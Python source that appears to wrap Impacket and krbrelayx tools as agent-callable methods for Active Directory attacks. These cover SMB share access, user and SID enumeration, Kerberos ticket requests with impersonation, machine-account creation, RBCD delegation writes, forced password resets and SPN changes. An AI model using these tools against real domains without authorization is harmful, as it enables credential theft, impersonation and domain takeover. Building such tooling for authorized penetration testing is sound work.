
    async def smb_shares(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """List SMB shares on a remote host."""
        self.logger.info(f"Listing SMB shares on {target}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        # Use smbclient with piped stdin commands
        cmd = ["impacket-smbclient"]
        cmd.extend(auth_extra)
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)

        auth_env = self._get_auth_env() if kerberos else {}
        merged_env = {**os.environ, **auth_env} if auth_env else None
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                env=merged_env,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=b"shares\nexit\n"),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")

            combined = stdout_str + stderr_str

            # Detect connection-level failures before attempting to parse shares.
            # When connection fails (wrong port, host unreachable, refused, etc.),
            # impacket may dump usage text or error banners that the parser could
            # misinterpret as share names.
            _conn_error_patterns = [
                "Connection refused", "timed out", "No route to host",
                "Network is unreachable", "Connection reset",
                "Could not connect", "Name or service not known",
            ]
            conn_failed = any(p in combined for p in _conn_error_patterns)
            # Also treat usage/help text as a connection failure (wrong args
            # or port causes smbclient to never connect).
            conn_failed = conn_failed or "usage:" in combined.lower() or "impacket-smbclient [-h]" in combined

            if conn_failed:
                shares = []
            else:
                shares = self._parse_smb_shares(stdout_str, stderr_str)

            # Check for errors even when process exits 0
            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            success = True
            if conn_failed or (not shares and ("SessionError" in combined or "STATUS_" in combined or "KDC_ERR" in combined)):
                success = False
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SMB share listing failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "shares": shares,
                    "share_count": len(shares),
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMB share listing timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)

    async def smb_get(
        self,
        target: str,
        share: str,
        remote_path: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Download a file from an SMB share."""
        self.logger.info(f"Downloading {share}/{remote_path} from {target}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        # Create temp file for download
        fd, local_path = tempfile.mkstemp(prefix="smb_download_")
        os.close(fd)

        cmd = ["impacket-smbclient"]
        cmd.extend(auth_extra)
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)

        # Normalize path: impacket-smbclient get takes ONE arg (remote filename).
        # It saves to local CWD with basename. We cd to remote dir, get basename,
        # then move from CWD to our target local_path.
        smb_path = remote_path.replace("/", "\\")
        if not smb_path.startswith("\\"):
            smb_path = "\\" + smb_path

        # Split into directory and filename
        smb_dir = ntpath.dirname(smb_path)
        smb_file = ntpath.basename(smb_path)

        # Create a temp directory to download into (smbclient saves to CWD)
        download_dir = tempfile.mkdtemp(prefix="smb_dl_")

        auth_env = self._get_auth_env() if kerberos else {}
        merged_env = {**os.environ, **auth_env} if auth_env else None
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                env=merged_env,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=download_dir,  # smbclient saves to CWD
            )

            # cd to remote directory, then get just the filename
            cd_cmd = f"cd {smb_dir}\n" if smb_dir else ""
            commands = f"use {share}\n{cd_cmd}get {smb_file}\nexit\n"
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=commands.encode()),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")

            combined = stdout_str + stderr_str

            # Check if file was downloaded to the download dir
            downloaded_file = os.path.join(download_dir, smb_file)
            has_error = self._has_error_in_output(combined)
            # Move downloaded file to our target local_path
            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
                shutil.move(downloaded_file, local_path)
            if os.path.exists(local_path) and os.path.getsize(local_path) > 0 and not has_error:
                with open(local_path, "rb") as f:
                    raw = f.read()
                try:
                    content = raw.decode("utf-8")
                    encoding = "utf-8"
                except UnicodeDecodeError:
                    content = base64.b64encode(raw).decode("ascii")
                    encoding = "base64"
                return ToolResult(
                    success=True,
                    data={
                        "target": target,
                        "share": share,
                        "remote_path": remote_path,
                        "content": content,
                        "encoding": encoding,
                        "size": len(raw),
                    },
                    raw_output=content,
                )
            else:
                # Classify the error for proper error_class
                error_class, retryable, suggestions = self._classify_error(combined)
                # Additional pattern matching for common SMB download errors
                if error_class == "unknown":
                    if "STATUS_ACCESS_DENIED" in combined:
                        error_class = "permission"
                    elif "STATUS_BAD_NETWORK_NAME" in combined:
                        error_class = "params"
                    elif "timed out" in combined.lower() or "Timeout" in combined:
                        error_class = "timeout"
                        retryable = True
                return ToolResult(
                    success=False,
                    data={"target": target, "share": share, "remote_path": remote_path},
                    error=f"File download failed or empty",
                    raw_output=sanitize_output(combined),
                    error_class=error_class,
                    retryable=retryable,
                    suggestions=suggestions,
                )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMB download timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)
        finally:
            if os.path.exists(local_path):
                os.remove(local_path)
            if os.path.exists(download_dir):
                shutil.rmtree(download_dir, ignore_errors=True)

    async def smb_put(
        self,
        target: str,
        share: str,
        remote_path: str,
        content: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Upload content to an SMB share."""
        self.logger.info(f"Uploading to {share}/{remote_path} on {target}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        # Write content to temp file
        fd, local_path = tempfile.mkstemp(prefix="smb_upload_")
        os.write(fd, content.encode())
        os.close(fd)

        cmd = ["impacket-smbclient"]
        cmd.extend(auth_extra)
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)

        # Normalize path: impacket-smbclient put takes ONE arg (local file path).
        # It uploads to the current SMB directory with the same basename.
        # We cd to the remote directory, then put the local file.
        smb_path = remote_path.replace("/", "\\")
        if not smb_path.startswith("\\"):
            smb_path = "\\" + smb_path

        smb_dir = ntpath.dirname(smb_path)
        smb_file = ntpath.basename(smb_path)

        # Rename temp file to match desired remote filename (smbclient uses local basename)
        upload_dir = tempfile.mkdtemp(prefix="smb_ul_")
        upload_path = os.path.join(upload_dir, smb_file)
        shutil.move(local_path, upload_path)
        local_path = upload_path

        auth_env = self._get_auth_env() if kerberos else {}
        merged_env = {**os.environ, **auth_env} if auth_env else None
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                env=merged_env,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            # cd to remote directory, then put the local file
            cd_cmd = f"cd {smb_dir}\n" if smb_dir else ""
            commands = f"use {share}\n{cd_cmd}put {local_path}\nexit\n"
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=commands.encode()),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")
            combined = stdout_str + stderr_str

            # Check for errors using the shared helper
            has_error = self._has_error_in_output(combined)

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if has_error:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SMB upload failed"

            return ToolResult(
                success=not has_error,
                data={
                    "target": target,
                    "share": share,
                    "remote_path": remote_path,
                    "size": len(content) if not has_error else 0,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMB upload timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))
        finally:
            if os.path.exists(local_path):
                os.remove(local_path)
            if os.path.exists(upload_dir):
                shutil.rmtree(upload_dir, ignore_errors=True)

    # ── Enumeration Methods ──────────────────────────────────────────────

    async def get_ad_users(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        all: bool = True,
        specific_user: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Enumerate AD users via LDAP."""
        self.logger.info(f"Enumerating AD users on {target}")

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-GetADUsers"]
        cmd.extend(auth_extra)
        if all:
            cmd.append("-all")
        if specific_user:
            cmd.extend(["-user", specific_user])
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            users = self._parse_ad_users(result.stdout, result.stderr)
            combined = result.stdout + result.stderr

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or bool(users)) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "AD user enumeration failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "users": users,
                    "user_count": len(users),
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)

    async def lookupsid(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        max_rid: int = 4000,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """SID brute-force domain enumeration."""
        self.logger.info(f"LookupSID on {target} (max RID: {max_rid})")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-lookupsid"]
        cmd.extend(auth_extra)
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)
        cmd.append(str(max_rid))  # maxRid is a positional argument

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            parsed = self._parse_lookupsid_output(result.stdout, result.stderr)
            combined = result.stdout + result.stderr

            # Detect errors even when returncode is 0
            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or parsed["total"] > 0) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SID lookup failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)

    # ── Kerberos Methods ─────────────────────────────────────────────────

    async def get_tgt(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Request a Kerberos TGT and save ccache file."""
        self.logger.info(f"Requesting TGT for {username}@{domain or target}")

        # Auto-generate krb5.conf on first Kerberos operation
        effective_dc = dc_ip or target
        if domain and effective_dc:
            self._ensure_krb5_conf(domain, effective_dc)

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-getTGT"]
        cmd.extend(auth_extra)
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            # Find the generated ccache file
            ccache_path = None
            ccache_match = re.search(r"Saving ticket in (\S+\.ccache)", combined)
            if ccache_match:
                ccache_path = ccache_match.group(1)

            # Save ticket to /session/credentials/ for persistence
            principal = username or "unknown"
            if ccache_path and os.path.exists(ccache_path):
                self._save_ticket(principal, ccache_path)

            saved_path = self._tickets.get(principal)
            ccache_exists = bool(saved_path) or (ccache_path and os.path.exists(ccache_path))

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or ccache_exists) and not has_error

            # Classify errors when not successful
            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "TGT request failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "username": username,
                    "domain": domain,
                    "principal": username,
                    "ccache_file": saved_path or ccache_path,
                    "ccache_exists": ccache_exists,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class or ("timeout" if "timed out" in str(e).lower() else "unknown"),
                retryable="timed out" in str(e).lower(),
                suggestions=suggestions or (["Increase timeout or check network connectivity"] if "timed out" in str(e).lower() else []),
            )

    async def get_st(
        self,
        target: str,
        spn: str,
        impersonate: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        additional_ticket: Optional[str] = None,
        force_forwardable: bool = False,
        altservice: Optional[str] = None,
        u2u: bool = False,
        self_only: bool = False,
        dmsa: bool = False,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Request a service ticket via S4U2Self/S4U2Proxy for constrained delegation."""
        self.logger.info(f"Requesting ST for {impersonate} -> {spn}")

        # Auto-generate krb5.conf on first Kerberos operation
        effective_dc = dc_ip or target
        if domain and effective_dc:
            self._ensure_krb5_conf(domain, effective_dc)

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-getST"]
        cmd.extend(auth_extra)
        cmd.extend(["-spn", spn])
        cmd.extend(["-impersonate", impersonate])

        if additional_ticket:
            cmd.extend(["-additional-ticket", additional_ticket])
        if force_forwardable:
            cmd.append("-force-forwardable")
        if altservice:
            cmd.extend(["-altservice", altservice])
        if u2u:
            cmd.append("-u2u")
        if self_only:
            cmd.append("-self")
        if dmsa:
            cmd.append("-dmsa")

        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            # Find the generated ccache file
            ccache_path = None
            ccache_match = re.search(r"Saving ticket in (\S+\.ccache)", combined)
            if ccache_match:
                ccache_path = ccache_match.group(1)

            # Save ticket to /session/credentials/ with descriptive principal
            if ccache_path and os.path.exists(ccache_path):
                ticket_principal = f"{impersonate}@{spn}"
                self._save_ticket(ticket_principal, ccache_path)

            ccache_exists = ccache_path is not None and os.path.exists(ccache_path)
            saved_path = self._tickets.get(f"{impersonate}@{spn}", ccache_path)

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or ccache_exists) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "ST request failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "spn": spn,
                    "impersonate": impersonate,
                    "ccache_file": saved_path,
                    "ccache_exists": ccache_exists,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target, "spn": spn}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    async def addcomputer(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        computer_name: Optional[str] = None,
        computer_pass: Optional[str] = None,
        method: str = "SAMR",
        base_dn: Optional[str] = None,
        no_add: bool = False,
        delete: bool = False,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Create a machine account in Active Directory."""
        self.logger.info(f"Adding computer account via {method}")

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-addcomputer"]
        cmd.extend(auth_extra)
        cmd.extend(["-method", method])

        if computer_name:
            cmd.extend(["-computer-name", computer_name])
        if computer_pass:
            cmd.extend(["-computer-pass", computer_pass])
        if base_dn:
            cmd.extend(["-baseDN", base_dn])
        if no_add:
            cmd.append("-no-add")
        if delete:
            cmd.append("-delete")

        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            # Parse computer name and password from output
            created_name = computer_name
            created_pass = computer_pass
            name_match = re.search(r"Successfully added machine account (\S+)", combined)
            if name_match:
                created_name = name_match.group(1)
            pass_match = re.search(r"with password (\S+)", combined)
            if pass_match:
                created_pass = pass_match.group(1)

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or "Successfully added" in combined) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Add computer failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "computer_name": created_name,
                    "computer_pass": created_pass,
                    "method": method,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)

    async def find_delegation(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        target_domain: Optional[str] = None,
        filter_user: Optional[str] = None,
        include_disabled: bool = False,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Enumerate delegation settings across domain accounts."""
        self.logger.info(f"Finding delegation settings in {domain or target}")

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-findDelegation"]
        cmd.extend(auth_extra)
        if target_domain:
            cmd.extend(["-target-domain", target_domain])
        if filter_user:
            cmd.extend(["-user", filter_user])
        if include_disabled:
            cmd.append("-disabled")
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            # Parse tabular output into structured data
            delegations = []
            header_found = False
            for line in combined.split("\n"):
                stripped = line.strip()
                if not stripped:
                    continue
                if stripped.startswith("Impacket ") or stripped.startswith("[*]"):
                    continue
                if "AccountName" in stripped and "DelegationType" in stripped:
                    header_found = True
                    continue
                if stripped.startswith("---"):
                    continue
                if header_found:
                    cols = stripped.split()
                    if len(cols) >= 4:
                        delegations.append({
                            "account_name": cols[0],
                            "account_type": cols[1],
                            "delegation_type": cols[2],
                            "delegation_rights_to": " ".join(cols[3:]),
                        })

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or len(delegations) > 0) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Delegation enumeration failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "delegations": delegations,
                    "delegation_count": len(delegations),
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)

    async def rbcd(
        self,
        target: str,
        delegate_to: str,
        delegate_from: Optional[str] = None,
        action: str = "read",
        use_ldaps: bool = False,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Read, write, or clear Resource-Based Constrained Delegation."""
        self.logger.info(f"RBCD {action} on {delegate_to}")

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["python3", "/opt/impacket-scripts/rbcd.py"]
        cmd.extend(auth_extra)

        cmd.extend(["-delegate-to", delegate_to])
        cmd.extend(["-action", action])

        if delegate_from and action in ("write", "remove"):
            cmd.extend(["-delegate-from", delegate_from])
        if use_ldaps:
            cmd.append("-use-ldaps")

        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr
            has_error = self._has_error_in_output(combined)
            success = (
                result.returncode == 0
                or "written successfully" in combined.lower()
                or "attribute" in combined.lower()
                or "accounts allowed" in combined.lower()
            ) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "RBCD operation failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "delegate_from": delegate_from,
                    "delegate_to": delegate_to,
                    "action": action,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)

    async def changepasswd(
        self,
        target: str,
        new_password: str,
        altuser: Optional[str] = None,
        altpass: Optional[str] = None,
        althash: Optional[str] = None,
        reset: bool = False,
        protocol: str = "smb-samr",
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Change or force-reset a domain user's password."""
        self.logger.info(f"Password change on {target} via {protocol}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["python3", "/opt/impacket-scripts/changepasswd.py"]
        cmd.extend(auth_extra)
        cmd.extend(["-newpass", new_password])
        cmd.extend(["-protocol", protocol])

        if reset:
            cmd.append("-reset")
        if altuser:
            cmd.extend(["-altuser", altuser])
        if altpass:
            cmd.extend(["-altpass", altpass])
        if althash:
            cmd.extend(["-althash", althash])

        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr
            has_error = self._has_error_in_output(combined)
            success = (
                result.returncode == 0
                or "changed successfully" in combined.lower()
                or "password was changed" in combined.lower()
                or "password was reset" in combined.lower()
            ) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                # Bug 8 fix: classify "not allowed" as permission error
                if "not allowed" in combined.lower() and error_class == "unknown":
                    error_class = "permission"
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Password change failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "protocol": protocol,
                    "reset": reset,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)

    async def addspn(
        self,
        target: str,
        target_account: str,
        spn: str,
        action: str = "add",
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Add or remove a Service Principal Name on an AD account."""
        self.logger.info(f"SPN {action}: {spn} on {target_account}")

        # addspn.py (krbrelayx) uses: addspn.py -u user -p pass -t target -s spn [-r] dc_host
        cmd = ["python3", "/opt/krbrelayx/addspn.py"]

        if username:
            if domain:
                cmd.extend(["-u", f"{domain}\\{username}"])
            else:
                cmd.extend(["-u", username])
        if password:
            cmd.extend(["-p", password])
        elif hashes:
            # addspn.py accepts LM:NTLM hash via -p flag
            cmd.extend(["-p", hashes])
        cmd.extend(["-t", target_account])
        cmd.extend(["-s", spn])

        if action == "remove":
            cmd.append("-r")
        if kerberos:
            cmd.append("-k")
        if aes_key:
            cmd.extend(["-aesKey", aes_key])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        cmd.extend(self._parse_extra_args(extra_args))

        # Positional host arg: the LDAP server to connect to
        host = dc_ip or target
        cmd.append(host)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr
            has_error = self._has_error_in_output(combined)
            success = (
                result.returncode == 0
                or "added" in combined.lower()
                or "removed" in combined.lower()
                or "found" in combined.lower()
            ) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SPN operation failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "target_account": target_account,
                    "spn": spn,
                    "action": action,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(success=False, data={"target": target}, error=str(e),
                              error_class=ec, retryable=rt, suggestions=sg)


if __name__ == "__main__":
    ImpacketServer.main()
